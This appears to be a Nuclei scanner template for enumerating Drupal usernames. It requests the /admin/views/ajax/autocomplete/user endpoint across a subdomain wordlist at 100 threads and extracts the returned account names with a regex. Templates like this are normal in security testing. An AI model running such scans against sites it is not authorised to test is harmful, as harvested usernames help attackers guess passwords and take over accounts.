id: drupal-user-enum-ajax 1
info:
  author: 0w4ys
  name: Drupal User Enumration [Ajax]
  severity: info
  tags: drupal
requests:
- attack: sniper
  extractors:
  - part: body
    regex:
    - '"[\w \-\_\@\.]+\"'
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - '":"a.'
    - '":"A.'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /admin/views/ajax/autocomplete/user/a HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
  threads: 100
